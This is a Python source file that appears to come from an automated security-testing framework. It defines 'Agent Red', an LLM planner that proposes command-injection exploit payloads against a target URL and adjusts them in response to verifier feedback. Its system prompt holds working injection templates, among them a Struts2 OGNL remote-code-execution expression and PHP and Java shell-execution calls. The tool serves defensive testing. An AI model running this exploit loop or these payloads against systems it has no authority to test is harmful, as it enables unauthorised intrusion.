"""Agent Red: LLM planner that emits ExploitClaims, consuming feedback each turn."""
import json
import re
import time
from typing import Optional, List, Dict, Any, Tuple

import litellm
from litellm.exceptions import ServiceUnavailableError, RateLimitError, APIConnectionError

from veripen.core.schemas import (
    ExploitClaim,
    VulnerabilityType,
    InjectionPoint,
)

MODEL = "gemini/gemini-flash-lite-latest"


def call_with_retry(model: str, messages: List[Dict[str, str]],
                    max_retries: int = 5, base_delay: float = 2.0,
                    **kwargs) -> Any:
    last_exc: Optional[Exception] = None
    for attempt in range(max_retries):
        try:
            resp = litellm.completion(model=model, messages=messages, **kwargs)
            time.sleep(2.5)  # gentle pacing to avoid 429 storms
            return resp
        except (ServiceUnavailableError, RateLimitError, APIConnectionError) as e:
            last_exc = e
            if attempt == max_retries - 1:
                raise
            delay = base_delay * (2 ** attempt)
            print(f"[retry] {type(e).__name__} (attempt {attempt+1}/{max_retries}); sleeping {delay:.1f}s")
            time.sleep(delay)
    if last_exc:
        raise last_exc


RED_SYSTEM_PROMPT = """You are Agent Red in an automated security testing system.

Your task: given a target and its context, propose ONE exploit attempt per turn.

CRITICAL REQUIREMENT — COMMAND PLACEHOLDER:
In the "candidate_payload" field, you MUST place the literal placeholder {CMD}
exactly once, at the position where the shell command should be executed.
The verification oracle will substitute a fresh arithmetic canary into {CMD}.

Examples of valid {CMD} placement:
  - Shell injection:        ; {CMD};
  - Shell (chained):        | {CMD}
  - OGNL (Struts2):         %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#context.setMemberAccess(#_memberAccess)).(@org.apache.commons.io.IOUtils@copy(@java.lang.Runtime@getRuntime().exec('{CMD}').getInputStream(),@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))}
  - PHP system():           system('{CMD}')
  - Java ProcessBuilder:    new ProcessBuilder("/bin/bash","-c","{CMD}").start()

Do NOT hard-code a specific command like "id" or "whoami". Use {CMD} instead.
The payload MUST contain exactly one {CMD} placeholder.

You must output STRICT JSON matching this schema:
{
  "target_url": "string",
  "vulnerability_type": "CWE-78_Command_Injection",
  "injection_point": "POST_BODY" | "GET_PARAM" | "HEADER" | "JSON_FIELD",
  "parameter_name": "string or null",
  "candidate_payload": "string",
  "http_method": "POST",
  "headers": {},
  "red_rationale": "one sentence explaining why this attempt"
}

If PRIOR FEEDBACK is provided, read it and adjust your next attempt accordingly.
Do not repeat a payload that has already been rejected.
Output pure JSON only. No markdown, no code fences, no commentary.
"""


class AgentRed:
    def __init__(self, model: str = MODEL, temperature: float = 0.2):
        self.model = model
        self.temperature = temperature

    def _build_prompt(
        self,
        target_url: str,
        target_context: str,
        target_description: str,
        feedback_history: List[Dict[str, Any]],
    ) -> str:
        parts = [
            f"Target URL: {target_url}",
            f"Target context: {target_context}",
            f"Target description: {target_description}",
        ]
        if feedback_history:
            parts.append("\n--- PRIOR FEEDBACK ---")
            for i, entry in enumerate(feedback_history[-5:], 1):
                parts.append(
                    f"[Attempt {i}] payload={entry['payload']!r} "
                    f"verdict={entry['verdict']} "
                    f"code={entry['rejection_code']} "
                    f"feedback={entry['feedback'][:300]}"
                )
            parts.append("--- END FEEDBACK ---")
            parts.append("Based on the above, propose a DIFFERENT attempt.")
        return "\n".join(parts)

    def _parse_response(self, resp: Any) -> Tuple[ExploitClaim, int, int]:
        """Extract ExploitClaim and token counts from an LLM response.

        Handles:
          - None content (model returned empty)
          - Empty content (model returned empty string)
          - Markdown-fenced JSON
          - JSON embedded in prose
        """
        content = resp.choices[0].message.content
        if content is None or not content.strip():
            raise ValueError("LLM returned empty content")

        raw = content.strip()
        if raw.startswith("```"):
            raw = re.sub(r"^```[a-z]*\n?", "", raw)
            raw = re.sub(r"\n?```$", "", raw)

        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            m = re.search(r"\{.*\}", raw, re.DOTALL)
            if not m:
                raise ValueError(f"Could not extract JSON from LLM response: {raw[:200]}")
            data = json.loads(m.group(0))

        claim = ExploitClaim(**data)

        usage = getattr(resp, "usage", None)
        tokens_in = getattr(usage, "prompt_tokens", 0) if usage else 0
        tokens_out = getattr(usage, "completion_tokens", 0) if usage else 0
        return claim, tokens_in, tokens_out

    def propose(
        self,
        target_url: str,
        target_context: str,
        target_description: str,
        feedback_history: List[Dict[str, Any]],
    ) -> Tuple[ExploitClaim, int, int]:
        prompt = self._build_prompt(
            target_url, target_context, target_description, feedback_history
        )

        # Retry on empty/None responses, which Gemini occasionally returns.
        last_exc: Optional[Exception] = None
        for attempt in range(3):
            try:
                resp = call_with_retry(
                    model=self.model,
                    messages=[
                        {"role": "system", "content": RED_SYSTEM_PROMPT},
                        {"role": "user", "content": prompt},
                    ],
                    temperature=self.temperature,
                )
                return self._parse_response(resp)
            except ValueError as e:
                last_exc = e
                print(f"[red] Empty or malformed LLM response (attempt {attempt+1}/3): {e}")
                time.sleep(1.5)
                continue

        raise last_exc if last_exc else RuntimeError("Unreachable")